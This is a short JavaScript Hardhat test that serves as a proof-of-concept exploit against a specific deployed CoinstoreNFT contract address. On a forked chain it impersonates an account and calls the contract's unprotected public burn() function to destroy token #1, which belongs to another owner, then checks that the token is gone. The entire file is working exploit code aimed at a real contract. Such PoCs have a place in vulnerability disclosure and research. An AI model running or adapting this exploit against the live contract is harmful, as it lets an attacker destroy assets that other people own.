const { expect, assert } = require("chai");
const { ethers } = require("hardhat");
const {expectRevert} = require("@openzeppelin/test-helpers");

describe("CoinstoreNFT Public Burn Exploit PoC", function () {
    this.timeout("250000");
    let target;
    let accounts;
    before(async () => {
      target = await hre.ethers.getVerifiedContractAt("0x59585bbC68CDE26261Eb4B417A84aCAa5c5841db");
      accounts = await ethers.getSigners();
    });

    it("Read the correct address", async function () {   
        console.log("the contract address at block 15055615 is: " + target.address);
    });

    it("Call the public burn() function", async function(){
        console.log("NFT Owner of #1: " + await target.ownerOf(1));

        const attackerAddress = accounts[0].address;

        //Impersonate the attackerAddress account and send transaction
        await hre.network.provider.request({
            method: "hardhat_impersonateAccount",
            params: [attackerAddress]}
        );
        const attackerAccountSigner = await ethers.provider.getSigner(attackerAddress);

        const burnTx = await target.connect(attackerAccountSigner).burn(1);
        console.log("Burn transaction initiated from EOA: " + burnTx.from);
        await expect(target.connect(attackerAccountSigner).ownerOf(1)).to.be.revertedWith("ERC721: owner query for nonexistent token");
        console.log("CoinstoreNFT with tokenId #1 is successfully burnt")
    });

});